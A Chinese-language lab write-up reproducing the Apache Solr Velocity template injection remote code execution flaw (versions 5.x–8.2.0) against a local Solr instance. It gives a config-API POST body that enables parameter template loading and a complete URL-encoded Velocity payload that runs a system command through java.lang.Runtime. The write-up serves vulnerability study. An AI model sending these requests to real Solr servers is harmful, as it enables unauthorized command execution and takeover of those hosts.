---
typora-copy-images-to: image

---

# Apache Solr Velocity模板注入RCE漏洞复现

## 一、前言

Solr是一个独立的企业级搜索应用服务器,它对外提供类似于web-service的API接口,用户可以通过http请求,向搜索引擎服务器提交一定格式的XML文件,生成索引,也可以通过http get操作提出查找请求,并得到XML格式的返回结果。

## 二、漏洞描述

该漏洞的产生是由于两方面的原因：

当攻击者可以直接访问Solr控制台时，可以通过发送类似/节点名/config的POST请求对该节点的配置文件做更改。

Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模版，默认设置是false。
当设置params.resource.loader.enabled为true时，将允许用户通过设置请求中的参数来指定相关资源的加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。（来自360CERT）

## 三、影响范围

Apache Solr 5.x - 8.2.0，存在config API版本

四、环境搭建

下载地址

https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/

解压压缩包，启动solr

![1573479758591](/image/1573479758591.png)

访问http://127.0.0.1:8983/solr/#/~cores/new_core，添加new_core

![](/image/1573479895996.png)



## 四、漏洞复现

获取core名称

访问http://127.0.0.1:8983/solr/admin/cores?wt=json&indexInfo=false

![1573480278213](/image/1573480278213.png)

Apache Solr默认集成VelocityResponseWriter插件，该插件初始化参数中的params.resource.loader.enabled默认值设置为false，但是可以通过POST请求直接修改集合设置，将其设置为true，然后就可以构造特殊的GET请求来实现远程代码执行。

![1573482066083](/image/1573482066083.png)

post以下数据，返回200响应码

        {
            "update-queryresponsewriter": {
            "startup": "lazy",
            "name": "velocity",
            "class": "solr.VelocityResponseWriter",
            "template.base.dir": "",
            "solr.resource.loader.enabled": "true",
            "params.resource.loader.enabled": "true"
            }
        }
![1573482566107](/image/1573482566107.png)

构造paloayer实现rce:

[http://127.0.0.1:8983/solr/new_core/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%22id%22))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()\])$str.valueOf($chr.toChars($out.read()))%23end](http://127.0.0.1:8983/solr/new_core/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x='')+%23set($rt=$x.class.forName('java.lang.Runtime'))+%23set($chr=$x.class.forName('java.lang.Character'))+%23set($str=$x.class.forName('java.lang.String'))+%23set($ex=$rt.getRuntime().exec("id"))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end)

![1573482681109](/image/1573482681109.png)